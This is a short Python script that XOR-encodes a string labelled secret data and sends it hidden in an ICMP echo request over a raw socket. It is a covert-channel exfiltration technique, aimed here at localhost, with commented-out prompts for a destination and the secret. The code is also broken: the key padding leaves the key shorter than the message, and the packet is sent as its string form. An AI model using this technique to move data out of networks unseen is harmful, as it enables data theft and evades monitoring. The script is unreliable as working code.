import dpkt
import socket


def perform_xor(message):
    key="Xc"
    if (len(key)<len(message)):
        dif=(len(message)-len(key))
        padding=key[0:dif-1]
        key=(key+padding)

    counter=0
    xor_string=""
    while(counter<len(message)):
        new_chr=(ord(key[counter])^ord(message[counter]))
        xor_string=(xor_string+str(new_chr))
        counter=counter+1

    print("XOR STRING: " ,xor_string)
    return(xor_string)

    

#d_ip=input("Dest: ")
#secret=input("Enter secret data: ")
d_ip='127.0.0.1'
secret="HHHHHE"

icmp_packet= dpkt.icmp.ICMP()
icmp_packet.type=8

packet_body= dpkt.icmp.ICMP.Echo()
packet_body.id=50
packet_body.seq=12
packet_body.data=perform_xor(secret).encode()



icmp_packet.data=packet_body
print("SENDING: ", str(packet_body))
send=(str(packet_body).encode())



the_socket=socket.socket(socket.AF_INET, socket.SOCK_RAW,dpkt.ip.IP_PROTO_ICMP)
the_socket.connect((d_ip,1))
the_socket.send(send)



